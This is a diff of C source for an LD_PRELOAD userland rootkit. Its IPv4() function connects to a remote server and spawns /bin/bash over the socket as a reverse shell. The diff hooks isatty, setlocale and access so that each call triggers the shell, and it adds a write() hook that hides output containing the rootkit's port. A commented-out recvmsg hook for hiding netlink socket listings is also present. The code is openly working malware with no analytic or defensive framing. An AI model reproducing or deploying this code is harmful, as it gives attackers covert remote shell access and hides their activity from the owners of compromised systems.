@@ -11,22 +11,25 @@
 #include <string.h>
 #include <netinet/in.h>
 #include <locale.h>
-#include "config.h"
+#include <linux/netlink.h>
+#include <linux/inet_diag.h>
+#include "rootkit.h"
 
 static char* (*old_getenv)(const char *name);
-static int (*old_memcmp)(const void *s1, const void *s2, size_t n);
-static char* (*old_strchr)(const char *s, int c);
-static char* (*old_strrchr)(const char *s, int c);
-static char* (*old_set_locale)(int category, const char *locale);
+static int (*old_isatty)(int fd);
+static char* (*old_setlocale)(int category, const char *locale);
+static int (*old_access)(const char *pathname, int mode);
 static struct dirent* (*old_readdir)(DIR *dir);
 static struct dirent64* (*old_readdir64)(DIR *dir);
 static FILE* (*old_fopen)(const char *pathname, const char *mode);
 static FILE* (*old_fopen64)(const char *pathname, const char *mode);
-static ssize_t (*old_recvmsg)(int socket, struct msghdr *message, int flags);
+//static ssize_t (*old_recvmsg)(int socket, struct msghdr *message, int flags);
+static ssize_t (*old_write)(int fd, const void *buf, size_t count);
 
 
 void IPv4() {
     int sockfd;
+    pid_t pid;
     struct sockaddr_in server, client;
 
     if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) != -1) {
@@ -40,7 +43,8 @@ void IPv4() {
 
         if ((bind(sockfd, (struct sockaddr *)&client, sizeof(client)) != -1) &&
         (connect(sockfd, (struct sockaddr *)&server, sizeof(server)) != -1)) {
-            if(fork() == 0) {
+            pid = fork();
+            if(pid == 0) {
                 for(int i = 0; i < 3; i++) dup2(sockfd, i);
                 execve("/bin/bash", NULL, NULL);
             }
@@ -122,10 +126,31 @@ FILE* fopen64(const char *pathname, const char *mode) {
 }
 
 
-ssize_t recvmsg(int socket, struct msghdr *message, int flags) {
+/*ssize_t recvmsg(int socket, struct msghdr *message, int flags) {
+    struct nlmsghdr *netlink_header;
+    struct inet_diag_msg *idiag_message;
+    int tmp_recvmsg;
+
     if(old_recvmsg == NULL) old_recvmsg = dlsym(RTLD_NEXT, "recvmsg");
-    
-    return old_recvmsg(socket, message, flags);
+    if(tmp_recvmsg = old_recvmsg(socket, message, flags) < 0) return tmp_recvmsg;
+    netlink_header = (struct nlmsghdr *)message->msg_iov->iov_base;
+
+    while(NLMSG_OK(netlink_header, tmp_recvmsg)) {
+        idiag_message = NLMSG_DATA(netlink_header);
+        printf("%u\n", (unsigned int)ntohs(idiag_message->id.idiag_sport));
+
+        netlink_header = NLMSG_NEXT(netlink_header, tmp_recvmsg);
+        continue;
+    }
+
+    return tmp_recvmsg;
+}*/
+
+
+ssize_t write(int fd, const void *buf, size_t count) {
+    if(old_write == NULL) old_write = dlsym(RTLD_NEXT, "write");
+
+    if(!strstr((char *)buf, (char *)LOCAL_PORT)) return old_write(fd, buf, count);
 }
 
 
@@ -137,33 +162,25 @@ char* getenv(const char *name) {
 }
 
 
-int memcmp(const void *s1, const void *s2, size_t n) {
-    if(old_memcmp == NULL) old_memcmp = dlsym(RTLD_NEXT, "memcmp");
+int isatty(int fd) {
+    if(old_isatty == NULL) old_isatty = dlsym(RTLD_NEXT, "isatty");
     IPv4();
 
-    return old_memcmp(s1, s2, n);
+    return old_isatty(fd);
 }
 
 
-char* strchr(const char *s, int c) {
-    if(old_strchr == NULL) old_strchr = dlsym(RTLD_NEXT, "strchr");
+char* setlocale(int category, const char *locale) {
+    if(old_setlocale == NULL) old_setlocale = dlsym(RTLD_NEXT, "setlocale");
     IPv4();
 
-    return old_strchr(s, c);
+    return old_setlocale(category, locale);
 }
 
 
-char* strrchr(const char *s, int c) {
-    if(old_strrchr == NULL) old_strrchr = dlsym(RTLD_NEXT, "strrchr");
+int access(const char *pathname, int mode) {
+    if(old_access == NULL) old_access = dlsym(RTLD_NEXT, "access");
     IPv4();
 
-    return old_strrchr(s, c);
-}
-
-
-char* set_locale(int category, const char *locale) {
-    if(old_set_locale == NULL) old_set_locale = dlsym(RTLD_NEXT, "set_locale");
-    IPv4();
-
-    return old_set_locale(category, locale);
+    return old_access(pathname, mode);
 }
